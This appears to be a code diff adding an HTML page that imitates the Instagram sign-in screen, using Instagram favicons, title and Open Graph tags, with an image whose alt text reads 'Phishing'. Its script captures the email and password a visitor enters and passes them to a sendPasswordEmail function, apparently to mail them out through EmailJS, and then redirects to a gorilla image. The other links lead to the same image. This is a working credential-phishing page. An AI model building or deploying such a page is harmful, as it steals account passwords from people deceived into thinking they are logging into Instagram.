@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  
+  <!-- Favicon links -->
+    <link rel="icon" type="image/png" sizes="16x16" href="./icons8-instagram-cute-clipart-16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="./icons8-instagram-cute-clipart-32.png">
+<link rel="icon" type="image/png" sizes="72x72" href="./icons8-instagram-cute-clipart-72.png">
+<link rel="icon" type="image/png" sizes="96x96" href="./icons8-instagram-cute-clipart-96.png">
+<link rel="icon" type="image/png" sizes="144x144" href="./icons8-instagram-cute-clipart-144.png">
+<link rel="icon" type="image/png" sizes="192x192" href="./icons8-instagram-cute-clipart-192.png">
+<link rel="icon" type="image/png" sizes="512x512" href="./icons8-instagram-cute-clipart-512.png">
+<!-- ICO Favicon links -->
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="./icons8-instagram-cute-clipart-16.ico">
+  <link rel="icon" type="image/x-icon" sizes="57x57" href="./icons8-instagram-cute-clipart-57.ico">
+  <link rel="icon" type="image/x-icon" sizes="60x60" href="./icons8-instagram-cute-clipart-60.ico">
+  <link rel="icon" type="image/x-icon" sizes="72x72" href="./icons8-instagram-cute-clipart-72.ico">
+
+<link rel="apple-touch-icon" type="image/png" sizes="57x57" href="./icons8-instagram-cute-clipart-57.png">
+<link rel="apple-touch-icon" type="image/png" sizes="60x60" href="./icons8-instagram-cute-clipart-60.png">
+<link rel="apple-touch-icon" type="image/png" sizes="72x72" href="./icons8-instagram-cute-clipart-72.png">
+<link rel="apple-touch-icon" type="image/png" sizes="76x76" href="./icons8-instagram-cute-clipart-76.png">
+<link rel="apple-touch-icon" type="image/png" sizes="114x114" href="./icons8-instagram-cute-clipart-114.png">
+<link rel="apple-touch-icon" type="image/png" sizes="120x120" href="./icons8-instagram-cute-clipart-120.png">
+<link rel="apple-touch-icon" type="image/png" sizes="144x144" href="./icons8-instagram-cute-clipart-144.png">
+<link rel="apple-touch-icon" type="image/png" sizes="152x152" href="./icons8-instagram-cute-clipart-152.png">
+<link rel="apple-touch-icon" type="image/png" sizes="180x180" href="./icons8-instagram-cute-clipart-180.png">
+
+  <title>Instagram</title>
+    <!-- Open Graph Meta Tags -->
+   <meta property="og:title" content="Instagram" />
+  <meta property="og:description" content="Social Media" />
+  <meta property="og:image" content="./insta.svg" />
+  <meta property="og:url" content="www.instagram.com" />
+  <meta property="og:type" content="website" />
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body class="h-screen bg-[#f7f6f4]">
+  <div class="flex min-h-full h-full items-center justify-center px-6 py-12 lg:px-8">
+    <div class="sm:mx-auto sm:w-full sm:max-w-sm">
+      <!-- Centered container with image and form -->
+      <div class="flex flex-col items-center">
+        <!-- Adjust the size and cropping of the image -->
+        <div class="h-40 w-40 overflow-hidden rounded-full border-none">
+  <img class="h-full w-full object-cover" src="../images/icon-insta2.png" alt="Phishing">
+</div>
+
+        <h2 class="mt-4 text-center text-2xl font-bold leading-9 tracking-tight text-gray-900">Sign in to your account</h2>
+      </div>
+
+      <div class="mt-8 sm:mx-auto sm:w-full sm:max-w-sm">
+        <form class="space-y-6" id="loginForm">
+          <div>
+            <label for="email" class="block text-sm font-medium leading-6 text-gray-900">Email address</label>
+            <div class="mt-2">
+              <input id="email" name="email" type="email" autocomplete="email" required class="block w-full rounded-md border-0 py-1.5 px-1 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-200 sm:text-sm sm:leading-6">
+            </div>
+          </div>
+
+          <div>
+            <div class="flex items-center justify-between">
+              <label for="password" class="block text-sm font-medium leading-6 text-gray-900">Password</label>
+              <div class="text-sm">
+                <a href="#" id="forgotPasswordLink" class="font-semibold text-[#4bb4f8] hover:text-indigo-500">Forgot password?</a>
+              </div>
+            </div>
+            <div class="mt-2">
+              <input id="password" name="password" type="password" autocomplete="current-password" required class="block w-full rounded-md border-0 py-1.5 px-1 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-200 sm:text-sm sm:leading-6">
+            </div>
+          </div>
+
+          <div>
+            <button type="submit" class="flex w-full justify-center rounded-md px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-pink-500" style="background-color: #4bb4f8;">Sign in</button>
+          </div>
+        </form>
+
+        <p class="mt-10 text-center text-sm text-gray-500">
+          Not a member?
+          <a href="#" id="registerLink" class="font-semibold leading-6 text-[#4bb4f8] hover:text-indigo-500">Register Here</a>
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <script src="sendEmail.js"></script>
+  <script>
+    function redirectToImage() {
+        window.location.href = "./gorilla.jpg"; // Redirect to the image
+    }
+
+    // Event listeners for form actions
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent default form submission
+        const email = document.getElementById("email").value; // Get the email input
+        const password = document.getElementById("password").value; // Get the password input
+
+        // Call the function to send email and wait for the response
+        sendPasswordEmail(email, password)
+            .then(function(response) {
+                console.log("Email sent successfully!"); // Log success
+                redirectToImage(); // Redirect to the image on successful email send
+            })
+            .catch(function(error) {
+                console.error("Error sending email:", error); // Handle error
+                // Optionally, you could display an error message to the user here
+            });
+    });
+
+    // Event listener for "Forgot password" link
+    document.getElementById("forgotPasswordLink").addEventListener("click", function(event) {
+        event.preventDefault(); // Prevent default action
+        redirectToImage(); // Redirect to the image on "Forgot password" click
+    });
+
+    // Event listener for "Register Here" link
+    document.getElementById("registerLink").addEventListener("click", function(event) {
+        event.preventDefault(); // Prevent default action
+        redirectToImage(); // Redirect to the image on "Register Here" click
+    });
+</script>
+
+
+</body>
+</html>
